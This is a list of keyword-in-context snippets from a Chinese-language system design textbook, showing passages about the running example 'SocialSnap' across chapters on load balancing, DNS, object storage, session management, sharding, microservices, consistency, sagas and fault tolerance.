  c09_b01.md: ...cialSnap 的规模下，第 5 步才是有趣的系统设计决策所在。   ### 9.2 负载均衡器——分配工作  假设 SocialSnap 运行 5 台应用服务器。哪个服务器应该处理 incoming 请求？答案不能是“总是 server 1”——serve...
  c09_b04.md: ...轮询和最少连接算法均匀分发请求，这对无状态应用服务器很好（每台服务器都能处理任何请求）。但它们给缓存带来问题。  想象 SocialSnap 的 Redis 缓存是一个三节点集群：Redis-1、Redis-2、Redis-3。应用对每个缓存 key 哈希以决...
  c09_b05.md: ...om` 的权威服务器）。 6. 根域名服务器指向 `.com` 的 TLD 域名服务器。 7. TLD 域名服务器指向 SocialSnap 的权威域名服务器（注册域名时配置）。 8. SocialSnap 的权威域名服务器返回 IP 地址。  最终答案在各层...
  c09_b05.md: ...TLD 域名服务器。 7. TLD 域名服务器指向 SocialSnap 的权威域名服务器（注册域名时配置）。 8. SocialSnap 的权威域名服务器返回 IP 地址。  最终答案在各层按 DNS 记录的 TTL 缓存。常见 TTL：300 秒（5 分...
  c09_b05.md: ...#### DNS TTL 与缓存失效  DNS TTL 制造了一个熟悉的陈旧问题（回想第 7 章缓存 TTL）。如果 SocialSnap 需要改 IP 地址（迁移到新数据中心），DNS 记录变更传播很慢——缓存了旧 IP 的客户端会继续使用旧 IP，直到它...
  c09_b06.md: ...e。  **何时用 TCP：** 任何不能容忍数据丢失的应用——网页、文件传输、邮件、数据库连接、API 调用。  对 SocialSnap 的 API，TCP（通过 HTTP）是正确选择。对未来的实时功能（直播、多人游戏），UDP 可能合适。...
  c09_b07.md: ...HTTP 是请求-响应协议：客户端发送请求，服务器返回响应。服务器不能在没有客户端先请求的情况下主动发送数据。  但 SocialSnap 的通知功能需要服务器实时把通知推送给在线用户。当有人点赞 Alice 的帖子，Alice 应该立即看到通知角标更新——...
  c09_b09.md: ...供公共消费者，gRPC 供内部服务，WebSocket 供实时功能。   ### 9.8 API 网关与限流  随着 SocialSnap 成长，应用服务器处理所有事情：认证、授权、请求路由、限流、日志和实际业务逻辑。这变得难以驾驭。**API 网关** 把...
  c09_b11.md: ...`INCR` 和过期命令。注意这个模式：Redis 再次出现，这里用于其原子计数器和亚毫秒级访问时间，正如第 7 章 SocialSnap 缓存中那样。   ### 9.9 权衡矩阵——负载均衡与 API 设计  权衡矩阵新增两行：  架构选择 | 延迟 |...
  c09_b14.md: ...#### 应用问题  **Q1.** SocialSnap 考虑把移动 API 从 REST 换成 GraphQL。移动应用现在渲染 home feed 需要 4 个 REST...
  c09_b14.md: ...移动网络上是显著胜利。服务器端复杂度是一次性投资。缓存策略需要思考，但第 7 章的积木可以直接套用。  **Q3.** SocialSnap 工程团队想加“在线状态”功能：用户头像上的绿点表示该用户当前在线。系统需要知道任意给定用户在过去 5 分钟内是否活跃。...
  c09_b15.md: ...er ID 有 presence key（在线），哪些没有。  **Q2.**（联系第 8 章消息队列和第 7 章缓存）SocialSnap 顶部导航中的通知计数角标实时更新。当 Alice 收到新赞时，浏览器应在 1 秒内显示更新后的计数。设计该功能从数据库...
  c09_b17.md: ...N、9.5 节的 DNS 和 9.8 节的 API 网关一起考虑。这三个组件位于用户与应用服务器之间。对请求 `www.socialsnap.com/users/alice`（一个公开资料页），如果 CDN 已缓存该页，追踪哪个组件处理请求、哪些被绕过。这告诉...
  c09_b17.md: ...的资料页：  1. **DNS 解析：** 域名解析为 CDN 边缘节点 IP（DNS 记录指向 CDN，而非直接指向 SocialSnap 服务器）。DNS 解析仍然发生——浏览器仍需查找 IP 地址。  2. **CDN 边缘节点完全处理请求。** CDN...
  c09_b17.md: ...有数据库查询。  3. **API 网关被绕过。** 无限流检查、无认证、无路由。  4. **应用服务器被绕过。** SocialSnap 源基础设施对该请求零负载。  发挥中的设计原则：**在协议栈尽可能早的位置服务请求**。请求经过的每个组件都会增加延迟...
  c10_b01.md: ...SocialSnap v3 有用户数据和帖子的数据库、热读缓存、后台处理的消息队列。但有一个当前架构无法处理的功能需求：头像图片。  用户想...
  c10_b01.md: ...和帖子的数据库、热读缓存、后台处理的消息队列。但有一个当前架构无法处理的功能需求：头像图片。  用户想上传头像。上传后，SocialSnap 需要存储一个可能 2 MB 的 JPEG 文件。当朋友访问其资料页时，SocialSnap 需要把文件返回给潜在成千上...
  c10_b01.md: ...用户想上传头像。上传后，SocialSnap 需要存储一个可能 2 MB 的 JPEG 文件。当朋友访问其资料页时，SocialSnap 需要把文件返回给潜在成千上万的同时访问者。  文件放哪里？  天真的答案：存到 PostgreSQL 数据库，作为 b...
  c10_b03.md: ...吐限制，超过后需要集群方案。 * **地理分布：** 传统文件系统是单点的；从另一个数据中心访问会增加网络延迟。  对 SocialSnap 的头像照片，传统文件系统在小规模下可用，但在数百万用户、每个用户数百万文件时会变成性能和运维瓶颈。...
  c10_b04.md: ...### 10.4 对象存储——媒体的可扩展方案  最适合 SocialSnap 头像照片的存储类型是**对象存储（object storage）**——一种完全不同的范式。  对象存储不使用分层目录...
  c10_b04.md: ...典型例子：Amazon S3（Simple Storage Service）。概念模型：       Bucket: socialsnap-media         Object key: users/42/profile-photo.jpg...
  c10_b04.md: ...应用服务器的带宽不被媒体文件服务消耗。  **大规模便宜：** 对象存储每月约 0.02–0.03 USD/GB。一个 SocialSnap 用户上传 50 次头像照片（每次 2 MB），每月存储成本约 0.002 USD。经济学与把同样数据存在 SSD 数据...
  c10_b06.md: ...### 10.5 SocialSnap 的媒体问题——头像照片放哪里？  让我们把这个框架应用到 SocialSnap 的具体问题。  **需求：**  *...
  c10_b06.md: ...### 10.5 SocialSnap 的媒体问题——头像照片放哪里？  让我们把这个框架应用到 SocialSnap 的具体问题。  **需求：**  * 为（最终）数百万用户存储头像照片 * 向查看资料的用户提供头像照片——高读取量、...
  c10_b06.md: ...WAL、fsync）对文件数据增加了不必要开销。  **方案 2：存在应用服务器本地文件系统**       /var/socialsnap/photos/user_42_profile.jpg   这比数据库有改进，但引入不同问题：文件在某一台特定服务器上。...
  c10_b06.md: ...hotos/user_42_profile.jpg   这比数据库有改进，但引入不同问题：文件在某一台特定服务器上。当 SocialSnap 增加应用服务器（第 11 章）时，哪台服务器有用户 42 的照片？如果存照片的服务器宕机，照片不可用。如果 Socia...
  c10_b06.md: ...lSnap 增加应用服务器（第 11 章）时，哪台服务器有用户 42 的照片？如果存照片的服务器宕机，照片不可用。如果 SocialSnap 有 10 台服务器，你需要某种方式把照片请求路由到存文件的特定服务器——应用路由与存储位置紧耦合。  **方案 3：存...
  c10_b06.md: ...的特定服务器——应用路由与存储位置紧耦合。  **方案 3：存在对象存储中（正确答案）**       Bucket: socialsnap-media     Key: users/42/profile_photo_v3.jpg   照片上传工作流：  1....
  c10_b06.md: ...中存储对象存储 URL：`UPDATE users SET photo_url = 'https://storage.socialsnap.com/users/42/profile_photo_v3.jpg' WHERE id = 42`。 6. 使用 Re...
  c10_b06.md: .... 用户请求 Alice 的资料页。 2. 应用返回资料页，包含 `<img src="https://storage.socialsnap.com/users/42/profile_photo_v3.jpg">`。 3. 用户浏览器直接从对象存储获取图片——...
  c10_b06.md: ...### 10.5 SocialSnap 的媒体问题——头像照片放哪里？  让我们把这个框架应用到 SocialSnap 的具体问题。  **需求：**  *...
  c10_b06.md: ...### 10.5 SocialSnap 的媒体问题——头像照片放哪里？  让我们把这个框架应用到 SocialSnap 的具体问题。  **需求：**  * 为（最终）数百万用户存储头像照片 * 向查看资料的用户提供头像照片——高读取量、...
  c10_b06.md: ...WAL、fsync）对文件数据增加了不必要开销。  **方案 2：存在应用服务器本地文件系统**       /var/socialsnap/photos/user_42_profile.jpg   这比数据库有改进，但引入不同问题：文件在某一台特定服务器上。...
  c10_b06.md: ...hotos/user_42_profile.jpg   这比数据库有改进，但引入不同问题：文件在某一台特定服务器上。当 SocialSnap 增加应用服务器（第 11 章）时，哪台服务器有用户 42 的照片？如果存照片的服务器宕机，照片不可用。如果 Socia...
  c10_b06.md: ...lSnap 增加应用服务器（第 11 章）时，哪台服务器有用户 42 的照片？如果存照片的服务器宕机，照片不可用。如果 SocialSnap 有 10 台服务器，你需要某种方式把照片请求路由到存文件的特定服务器——应用路由与存储位置紧耦合。  **方案 3：存...
  c10_b06.md: ...的特定服务器——应用路由与存储位置紧耦合。  **方案 3：存在对象存储中（正确答案）**       Bucket: socialsnap-media     Key: users/42/profile_photo_v3.jpg   照片上传工作流：  1....
  c10_b06.md: ...中存储对象存储 URL：`UPDATE users SET photo_url = 'https://storage.socialsnap.com/users/42/profile_photo_v3.jpg' WHERE id = 42`。 6. 使用 Re...
  c10_b06.md: .... 用户请求 Alice 的资料页。 2. 应用返回资料页，包含 `<img src="https://storage.socialsnap.com/users/42/profile_photo_v3.jpg">`。 3. 用户浏览器直接从对象存储获取图片——...
  c10_b07.md: ...载（按 ID 查找一条记录）、小文件工作负载（HDFS 的大块大小对 1 KB 文件浪费），或对延迟敏感的应用。  对 SocialSnap，HDFS 不是头像照片的正确选择（随机访问、小文件）。但如果 SocialSnap 后来在其用户事件流（点击、浏览、点...
  c10_b07.md: ...浪费），或对延迟敏感的应用。  对 SocialSnap，HDFS 不是头像照片的正确选择（随机访问、小文件）。但如果 SocialSnap 后来在其用户事件流（点击、浏览、点赞）上构建 PB 级分析管道，HDFS 或云等价物（Amazon S3 用作 Spa...
  c10_b08.md: ...度到持有待处理数据块的节点上。当某计算节点处理完本地数据需要更多时，才会向其他节点请求——但这是例外，不是常态。  对 SocialSnap，这一原则解释了为什么复杂的 feed 排序计算应在数据库（或靠近数据的计算层）中完成，而不是把所有候选帖子取到应用服务...
  c10_b10.md: ...SD/月） * 1 PB 冷归档数据 → HDD（40,000 USD/月）vs 磁带（2,000 USD/月）  对 SocialSnap 头像照片：访问模式是“按 URL 读取二进制 blob”（对象存储模式），大小是 MB 级，50ms 延迟可接受（CD...
  c10_b12.md: ...的哈希决定每个对象存在哪台存储节点上。一组分布良好的 key（哈希值均匀散布在哈希空间）能把存储负载均匀分布。  如果 SocialSnap 所有对象 key 都以 `users/42/` 开头（共同前缀），内部存储路由可能把用户 42 的所有对象请求都发到同...
  c10_b13.md: ...#### 应用问题  **Q1.** SocialSnap 想增加视频上传：用户可以上传短视频（最长 60 秒，每个最大 100 MB）。上传后，视频应转码为多种分辨率（360p...
  c10_b13.md: ...想服务：用户如何播放 100 MB 视频而不等待整个文件下载？  **答案：**  **上传路径：**  1. 用户在 SocialSnap 应用中选择视频文件。 2. 应用向应用服务器请求**预签名上传 URL**（视频上传 API）：`POST /api/...
  c10_b14.md: ...这种架构意味着 SocialSnap 应用服务器在初始上传后不处理任何视频字节。所有视频带宽都走对象存储 → CDN → 用户浏览器。  **Q2.**（联...
  c10_b14.md: ...字节。所有视频带宽都走对象存储 → CDN → 用户浏览器。  **Q2.**（联系第 5 章索引讨论和第 7 章缓存）SocialSnap 把用户头像照片的对象存储 URL 存在 PostgreSQL `users` 表的 `photo_url` 列。该列包...
  c10_b14.md: ...失效失败）：** 数据库已有新 URL，但 Redis 缓存仍有旧 URL。用户在 TTL 分钟内会看到旧照片。这正是 SocialSnap 在第 7 章遇到的陈旧性 bug。缓解：重试缓存失效；使用短 TTL 作为安全网（即使失效失败，旧 URL 缓存最终也...
  c10_b15.md: ...个操作，失败总是干净中止（权威存储还未提交任何内容）。  **Q3.**（联系第 7 章缓存和第 9 章 CDN 讨论）SocialSnap 把头像照片存在对象存储并通过 CDN 服务。用户上传新头像后，即使新照片已上传到对象存储，仍有哪些缓存可能继续提供旧照...
  c10_b15.md: ...旧 key: users/42/profile_photo_v3.jpg  → URL: https://cdn.socialsnap.com/users/42/profile_photo_v3.jpg     新 key: users/42/profi...
  c10_b15.md: ...新 key: users/42/profile_photo_v4.jpg  → URL: https://cdn.socialsnap.com/users/42/profile_photo_v4.jpg   因为每次上传 URL 都变，旧 URL 的 C...
  c10_b17.md: ...地理分布式副本的网络比光速允许得更快。  **Q2.**（联系第 6 章 NoSQL 家族和第 5 章关系型数据库讨论）SocialSnap 分析团队想回答“过去 30 天有多少独立用户浏览了带 #systemdesign 标签的帖子，按国家细分？”源数据是浏...
  c10_b19.md: ...储层级。  **HDFS** 优化分布式分析管道中的大文件顺序读取——大块大小、一次写入语义和计算的数据本地性。  **SocialSnap 的媒体问题** 得到干净解决：头像照片属于对象存储，直接服务给浏览器或经 CDN，只有 URL 存在 PostgreS...
  c10_b19.md: ...）：更快存储每字节更贵，更慢存储更便宜。分层存储架构同时使用多层，让热数据快、冷数据便宜。  在第 11 章，我们回到 SocialSnap 的演进。有了缓存、消息队列，现在媒体存在对象存储中，架构已准备好复制——运行多台应用服务器而不是一台。但应用服务器复制...
  c11_b01.md: ...SocialSnap 从第 1 章笔记本上的一个 Python 函数走了很远。它现在拥有：  * 设计良好的 PostgreSQL 关系型数...
  c11_b01.md: ...器在**会话存储（session store）**（存放会话数据的位置）中查找该会话 ID，并取回相关用户信息。  在 SocialSnap v3（仍是单台服务器）中，会话存储就是应用服务器自己的内存——一个 Python 字典：       sessions...
  c11_b04.md: ...个副本），会话数据能经受任何单个 Redis 实例故障。本地内存中，服务器重启会丢失所有会话。  注意 Redis 在 SocialSnap 架构中已经是第三次出现：  1. 第 7 章：作为资料和帖子数据的缓存 2. 第 9 章：作为限流令牌桶的存储 3....
  c11_b05.md: ...### 11.4 SocialSnap v4——水平扩展达成  会话存储迁移到 Redis 后，SocialSnap v4 开始运行 3 台应用服务器。  v...
  c11_b05.md: ...### 11.4 SocialSnap v4——水平扩展达成  会话存储迁移到 Redis 后，SocialSnap v4 开始运行 3 台应用服务器。  v4 架构：       Internet         ↓     CDN...
  c11_b05.md: ...来自 50 台应用服务器的查询，负载是一台应用服务器时的 50 倍。  这是下一个瓶颈——也是第 12 章的主题。目前，SocialSnap v4 可以独立于数据库容量扩展应用服务器容量，这是一个显著的架构改进。   ### 11.5 JWT——无需服务器端存...
  c11_b06.md: ...：验证 key 共享，签名 key 私有）。不需要共享会话状态。  **可移植：** JWT 可跨域和跨服务使用。如果 SocialSnap 开发了独立 API 服务，它可以验证主应用签发的同一个 JWT——无需跨服务会话共享基础设施。   #### JWT...
  c11_b06.md: ...听起来是完美方案。为什么还要用 Redis 会话？  **撤销问题是致命局限。**  考虑：Alice 的账户被入侵。SocialSnap 安全团队强制登出 Alice 的账户。用 Redis 会话，这很简单：`DEL session:alice_sessi...
  c11_b07.md: ...验证身份） * 无需撤销的无状态 API 场景 * 大规模系统，即使每次请求 1ms 的 Redis 查找也成本显著  SocialSnap v4 使用 Redis 会话。撤销能力（账户安全）比 JWT 验证带来的边际延迟改善更重要。   ### 11.6 垂...
  c11_b11.md: ...。  无状态服务器彻底消除问题：没有需要路由绕开的每个客户端状态。任何服务器都能处理任何请求。  **Q2.** 描述 SocialSnap v4 初始部署中的会话管理 bug。根本原因是什么，修复是什么？  **答案：** 当 SocialSnap 在轮询负...
  c11_b11.md: ...* 描述 SocialSnap v4 初始部署中的会话管理 bug。根本原因是什么，修复是什么？  **答案：** 当 SocialSnap 在轮询负载均衡器后增加三台应用服务器时，用户遇到随机登出：点击任何链接都可能把他们登出，他们不得不反复重新登录。  *...
  c11_b13.md: ...#### 应用问题  **Q1.** 一位 SocialSnap 工程师提议用“粘性会话”解决会话问题——配置负载均衡器让把用户 42 的请求始终路由到 Server A，用户 7 到...
  c11_b13.md: ...有请求路由到同一服务器。在公司环境中，所有员工可能看起来有同一个外部 IP 地址（NAT 网关后）。如果一家大公司使用 SocialSnap，1000（1000）名员工都显示为同一 IP，他们全被路由到 Server A。Server A 负载达到 300%；...
  c11_b13.md: ...的）设计并增加路由复杂度和故障模式。正确修复是外部会话存储。  **Q2.**（联系第 7 章缓存和第 8 章消息队列）SocialSnap 的用户资料 API 处理函数在新的三台服务器架构中包含以下逻辑：       def get_user_profile...
  c11_b14.md: ...DEL` 命令都同时对所有服务器失效缓存条目。不一致缓存问题被消除。这就是第 7 章同一个 Redis 缓存——现在由 SocialSnap v4 的三台应用服务器共享。  **Q3.** SocialSnap 把头像照片存在对象存储中（第 10 章）。一位工...
  c11_b14.md: ...就是第 7 章同一个 Redis 缓存——现在由 SocialSnap v4 的三台应用服务器共享。  **Q3.** SocialSnap 把头像照片存在对象存储中（第 10 章）。一位工程师建议在应用服务器本地内存中缓存对象存储预签名 URL，以避免每次请...
  c11_b17.md: ...态（stateful，有状态的）服务。Redis 现在成为关键依赖：如果 Redis 故障，所有会话丢失，用户全部登出。SocialSnap 应如何设计 Redis 部署以避免 Redis 成为单点故障？如果 Redis 主节点故障，副本提升前有短暂中断，活跃...
  c11_b17.md: ...off（权衡）。故障窗口是秒级；受影响会话数量极小；替代方案（同步复制，阻塞每次写入直到副本确认）会给每次登录增加延迟。SocialSnap 以极小的会话丢失风险换取低延迟会话写入。  更深教训：无状态要求并未消除有状态——它只是把状态移入专门构建、可冗余的基...
  c11_b18.md: ...用服务器** 在负载均衡器把请求分发到多个实例时失败。存在一台服务器内存中的会话数据对其他服务器不可访问，导致随机登出。SocialSnap v4 在三台应用服务器轮询负载均衡器后立即发现了这一点。  **三种解决方案**——粘性会话、会话数据库、外部会话存储...
  c11_b18.md: ...所有服务器共享同一个 Redis 实例，因此无论哪台服务器处理请求，会话数据都可访问。  **Redis 第三次出现在 SocialSnap 架构中**，作为会话存储，与其先前作为缓存（第 7 章）和限流存储（第 9 章）的角色会合。Redis 的多功能性——...
  c11_b18.md: ...is）是标准缓解手段。  水平扩展的权衡矩阵项展示了本章核心交换：可用性和吞吐能力大幅提升，换取运维复杂度显著上升。  SocialSnap v4 现在是一个真正的分布式系统。多台应用服务器、一个共享 Redis 集群、一个 PostgreSQL 数据库、一个...
  c11_b18.md: ...QL。随着流量持续增长，数据库将成为约束。  第 12 章将直接面对这个瓶颈——读副本、查询优化，最终数据库分片，将是 SocialSnap 用来突破单数据库天花板的工具。...
  c12_b01.md: ...第 11 章解决了计算瓶颈。通过让应用服务器无状态并把会话状态外部化到 Redis，SocialSnap 现在在三台应用服务器后运行，吞吐翻了三倍。团队轻松了大约六周。  然后数据库开始变慢。  查询延迟从 5 毫秒爬到 5...
  c12_b02.md: ...### 12.2 读副本——第一个泄压阀  第一个观察：大多数生产系统中，读远多于写。SocialSnap 的工作负载很典型：每有一个人创建帖子（一次写），就有大约五十个人浏览 feed、资料或帖子（读）。比例可能是 10:1...
  c12_b03.md: ...你加副本想要缓解的高负载，让延迟问题更严重。  读副本是读重工作负载的泄压阀。写重工作负载需要不同方案。   #### SocialSnap v5——第一步  SocialSnap 团队增加两个 PostgreSQL 读副本。应用代码更新：写操作（INSERT...
  c12_b03.md: ...重。  读副本是读重工作负载的泄压阀。写重工作负载需要不同方案。   #### SocialSnap v5——第一步  SocialSnap 团队增加两个 PostgreSQL 读副本。应用代码更新：写操作（INSERT、UPDATE、DELETE）路由到主库...
  c12_b03.md: ...不解决写瓶颈 | 读重工作负载；读写比 10:1+   ### 12.3 分片——拆分数据本身  读副本解决读扩展。但 SocialSnap 继续增长。一年后用户基数（user base，BASE）翻了十倍。现在写成了瓶颈。主库 PostgreSQL 每秒处理...
  c12_b05.md: ...#### 热 shard 问题  即使基于哈希分片，特定模式也会造成热 shard：**热 key**。想象 SocialSnap 有一位名人用户——叫她 @nova——有 2000 万（20 million）粉丝。每次 @nova 发帖，都会触发...
  c12_b05.md: ...nap 第 7 章已做的 Redis），或在应用层把热 key 跨多个 shard 拆分。这些都不简单。   #### SocialSnap v5——按 user_id 分片  SocialSnap 团队决定对 `users` 和 `posts` 表按 `us...
  c12_b05.md: ...ey 跨多个 shard 拆分。这些都不简单。   #### SocialSnap v5——按 user_id 分片  SocialSnap 团队决定对 `users` 和 `posts` 表按 `user_id` 做哈希分片，共 8 个 shard。user...
  c12_b06.md: ...### 12.5 重分片的成本  假设 SocialSnap 从 8 个 shard 开始并继续增长。最终 8 个 shard 不够，团队需要 16 个。这需要**重分片（resh...
  c12_b06.md: ...和更多数据库实例要管理，但可能避免未来灾难性的迁移。   ### 12.6 反规范化——当 JOIN 变贵时  分片前，SocialSnap 的 schema 经过仔细规范化：用户数据在 `users` 表，帖子数据在 `posts` 表，好友数据在 `fri...
  c12_b06.md: ...户名改变时，应用必须同时更新 `users` 表和 `posts` 表中复制了用户名的每一行（可能是数百万行）。  在 SocialSnap 上，`posts` 表可能被反规范化以直接包含作者用户名和头像 URL，消除获取帖子显示时与 `users` JOIN...
  c12_b07.md: ...### 12.7 分布式事务——深层的痛  SocialSnap 中有一个操作需要原子更新：当用户被收取高级订阅费时，两件事必须一起发生——`payments` 表中创建一条支付记录，...
  c12_b07.md: ...` 可能在不同 shard（如果按不同 key 分片），也可能在同一 shard（如果都按 `user_id` 分片）。SocialSnap 的情况中，两张表都按 `user_id` 分片，因此同一用户的数据落在同一 shard——这个特定问题被避免了。  但...
  c12_b10.md: ...#### 应用问题  **Q1.** SocialSnap 按 `user_id % 8` 分片用户数据。团队想构建一个排行榜：“本周收到总点赞数最高的 10 位用户”。描述在分...
  c12_b10.md: ...tradeoff：每笔转账操作更多（3 步而不是 2 步），托管记录必须小心管理以避免孤儿托管条目。  **Q3.** SocialSnap 把 `username` 字段反规范化到 `posts` 表以避免跨 shard JOIN。用户修改用户名。写出更新过...
  c13_b01.md: ...第 12 章中，SocialSnap 对数据库分片以处理写入量。跨分片查询问题立即出现：查询跨越多个 shard 的数据需要在应用代码中写扇出逻辑，跨 sh...
  c13_b02.md: ...### 13.1 单体及其不满  理解微服务之前，先理解它们在取代什么。  SocialSnap 从单体开始：一个代码库、一个进程、一个数据库。这不是贬义——单体几乎是每个成功系统的自然起点。单体容易开发（一个仓库、...
  c13_b04.md: ...扩展性（scalability）需求。** 如果某个功能的流量增长速度是其他所有功能的 10 倍，它可能值得自己的服务。SocialSnap 的图片上传功能比消息功能需要更多计算（缩略图生成、对象存储上传）。把它们分开，图片上传 worker 可以独立于消息...
  c13_b10.md: ...藏耦合，破坏了微服务架构的全部意义。  **Q2.** 什么是康威定律（Conway's Law）？举一个它如何适用于 SocialSnap 团队结构的例子。  **答案：** 康威定律指出，任何设计系统的组织，其产生的设计都会镜像该组织的沟通结构。系统由构建...
  c13_b10.md: ...* 康威定律指出，任何设计系统的组织，其产生的设计都会镜像该组织的沟通结构。系统由构建它们的团队的沟通模式塑造。  对 SocialSnap：如果公司有专门的支付团队、通知团队、用户资料团队——每个团队有自己的 Slack 频道、路线图和 on-call 轮值...
  c13_b11.md: ...#### 应用问题  **Q1.** SocialSnap 想从单体拆成微服务。当前应用功能包括：用户认证、帖子创建/浏览、私信、支付/订阅、通知。用本章的侦探纪律，识别哪些适合...
  c13_b12.md: ...要有不必要的同步跳数）、用熔断器（第 16 章）快速失败而不是等待超时，以及尽可能把同步链转为异步。  **Q3.** SocialSnap 团队决定拆分单体。帖子功能和通知功能当前纠缠在一起：帖子创建代码直接在创建帖子的 SQL 事务中向 `notifica...
  c14_b05.md: ...basis 上交换一致性、可用性和延迟的能力。陈旧可接受的操作用 ONE。陈旧不可接受的操作用 QUORUM。  对 SocialSnap：读取公开显示的帖子点赞数可以用 ONE——展示落后 1 秒的计数无害。写入支付记录必须用 QUORUM——你需要告诉用...
  c14_b07.md: ...点都可以无需协调递增自己的本地计数器。合并两个 G-Counter 时，取每个本地计数器的最大值。这总能得到正确的总和。SocialSnap 帖子的点赞数可以是 G-Counter——任何服务器都可以本地记录一次点赞递增，最终通过合并计算总数。  **OR-S...
  c14_b07.md: ...列）。对需要复杂语义的数据（例如“余额绝不能为负”），CRDT 可能不适用。   ### 14.9 跨区域复制  随着 SocialSnap 国际化增长，欧洲用户距离美国数据中心 150 毫秒。欧洲用户的每次数据库读仅网络往返就要 150 毫秒。对交互式应用不...
  c14_b08.md: ...区域写：** 所有写都进入某个指定“主”区域；其他区域是只读副本。这消除写冲突，但给非主区域用户写操作带来延迟。  对 SocialSnap：用户资料更新（改简介）很少发生，可以无大碍地用最后写入获胜——不同地区同一用户同时编辑资料的概率可忽略。帖子点赞数可以...
  c14_b10.md: ...的后续读仍能返回转账前 Alice 的余额，她可能再次转出同样 100 USD，导致双重支付。  最终一致性可接受场景：SocialSnap 帖子的显示点赞数。如果一条帖子有 10,247 个赞，而某个用户的点赞还没传播到所有节点，一些读者暂时看到 10,24...
  c14_b12.md: ...#### 应用问题  **Q1.** SocialSnap 的 Cassandra 集群复制因子 N=5。团队正在为两类操作选择一致性级别：(a) 读取用户自己的资料以便编辑；(...
  c14_b13.md: ...对社区页面描述而言，把冲突暴露给用户是最正确的方法——数据太重要、太可见，不能静默丢弃一个版本。  **Q3.** SocialSnap 想实现一个分布式点赞计数器，任何数据中心都能本地记录点赞，总数最终收敛。解释 G-Counter CRDT 在该场景如...
  c14_b15.md: ...冲突，适用于特定数据类型）。跨区域复制把这些挑战扩展到全球范围，必须预期并解决跨区域写冲突。  第 15 章，我们回到 SocialSnap 的传奇：“向用户收费并发送确认邮件”的操作必须是原子的，但它跨越支付服务和通知服务——两个无法共享事务的独立数据库。S...
  c15_b01.md: ...同一记录的并发写会产生必须解决的冲突。最强方案——协调事务所有参与者——很昂贵，有时跨服务边界根本不可能。  现在考虑 SocialSnap 中一个具体的、把所有铺垫结晶的操作。  用户点击“升级到高级版”。应用必须做三件事：  1. 向用户信用卡收费（Pay...
  c15_b01.md: ...1、2 步之间崩溃呢？部分状态。钱已扣走。服务没升级。  这就是**分布式事务问题**，却没有分布式事务机制。这不只是 SocialSnap 的问题——几乎每个微服务架构中有意义的业务操作都涉及多个必须在无共享事务的情况下协调的服务。  解决方案是 **Sag...
  c15_b02.md: ...cheduled jobs）**（也叫 cron 任务、批处理任务或周期性任务）是按时间表运行而非由事件触发的任务。  SocialSnap 的例子：  * 每小时计算热门帖子并更新热门缓存。 * 每天凌晨 2 点汇总当天分析事件并存为日汇总。 * 每月为高级...
  c15_b04.md: ...戳组合生成幂等键，以消除冲突。   ### 15.4 Saga 模式——不用 2PC 的分布式事务  现在我们有了处理 SocialSnap 高级版升级问题的工具。Saga 模式是一种在多个服务间实现分布式事务而不使用两阶段提交的设计模式。...
  c15_b05.md: ...款。  退款并不真正撤销扣款（银行记录仍会显示扣款和退款），但它抵消了业务效果。   #### 高级版升级 Saga  SocialSnap 高级版升级 saga 显式写出如下：  步骤 | 服务 | 正向操作 | 补偿事务 |---|---|---|---...
  c15_b09.md: ...### 15.7 SocialSnap 高级版升级——完整实现  把所有内容合起来，SocialSnap 使用编排和 Outbox 模式的高级版升级 saga...
  c15_b09.md: ...### 15.7 SocialSnap 高级版升级——完整实现  把所有内容合起来，SocialSnap 使用编排和 Outbox 模式的高级版升级 saga：  **第 1 步：** HTTP 处理器收到升级请求。它在数据...
  c15_b12.md: ...#### 应用问题  **Q1.** SocialSnap 想实现“关注用户”功能。关注用户 B 会触发三件事：(a) 在社交图服务中插入 `friendship` 记录；(b)...
  c15_b16.md: ...调无需 2PC 的多服务工作流。编舞通过事件把协调逻辑分布到各服务；编排把它集中在编排器服务。两种方法各有适用场景。  SocialSnap 开篇的“向用户收费并发送确认邮件”问题——本章开头的 Thread A 例子——现在完全可解：saga 配编排器、每次...
  c15_b16.md: ...恢复失败。  第 16 章把视角拉大到全系统失败。本章构建的所有异步处理让失败处理更容易——消息队列在故障期间缓冲流量。SocialSnap 将面临第一次生产故障，我们将看到熔断、舱壁和优雅降级如何决定这次故障是灾难还是可控的小插曲。...
  c16_b01.md: ...件会坏。软件有 bug。网络会分区。数据中心会断电。DNS 提供商会出故障。依赖项有自己的依赖项，它们随时可能失败。  SocialSnap 即将学到这一课。  某个周二下午。SocialSnap 有 300 万（3 million）活跃用户、三台应用服务器、...
  c16_b01.md: ...S 提供商会出故障。依赖项有自己的依赖项，它们随时可能失败。  SocialSnap 即将学到这一课。  某个周二下午。SocialSnap 有 300 万（3 million）活跃用户、三台应用服务器、一主两从（两个副本，replicas）PostgreSQ...
  c16_b01.md: ...负载均衡器队列中堆积，超出队列限制。负载均衡器开始向所有用户返回“503 Service Unavailable”。  SocialSnap 宕机了。  不是因为数据库故障。不是因为应用代码崩溃。而是因为一个依赖的部分失败——Redis 30% 请求返回错误—...
  c16_b03.md: ...：如果你某个东西只有一份，它失败整个系统就失败。一个数据库、一台服务器、一条网络路径——在添加冗余前都是 SPOF。  SocialSnap 早期架构（第 1 章）中，每个组件都是 SPOF：一台笔记本、一个数据库、一个进程。随着架构演进，SPOF 被逐步消除...
  c16_b04.md: ...要第 14 章的一致性机制——quorum 写、冲突解决、CRDT。   ### 16.4 熔断器模式  现在我们回到 SocialSnap 的周二的 outage。根因是级联：部分 Redis 失败阻塞应用线程，耗尽线程池，导致整个应用失败。  级联发生是因...
  c16_b06.md: ...请求开始失败。但关键路径线程池不受影响——用户仍可以浏览 feed、发帖、登录。失败被限制在外部 API 池中。  对 SocialSnap 的 Redis 失败：有了舱壁隔离，依赖 Redis 的会话验证可以有自己独立的线程池。Redis 失败时该池耗尽，但...
  c16_b07.md: ...雅降级的前提是事先明确哪些功能必要、哪些补充。这应在故障发生前——设计阶段——就定义好，而不是在事故中临时决定。  对 SocialSnap，合理的层级：  **第 1 层——必须工作：** 登录/登出、浏览帖子（基础 feed）、发帖、加载资料页。没有这些用...
  c16_b07.md: ...层——后台：** 分析日志、邮件通知、活动摘要。这些根本不应在关键路径上——它们已经是异步的（第 8、15 章）。  SocialSnap outage 中 Redis 会话存储失败时，一种可能的优雅降级响应：  * 对只读操作临时禁用会话验证（未登录浏览公...
  c16_b07.md: ...预定义行为。  常见回退策略：  **从缓存提供：** 数据库不可用时返回数据的最近缓存版本。数据可能陈旧，但比错误好。SocialSnap 在数据库变慢期间可提供缓存 feed 页面（第 7 章 Redis 缓存支持这点）。  **返回默认值：** 个性化数...
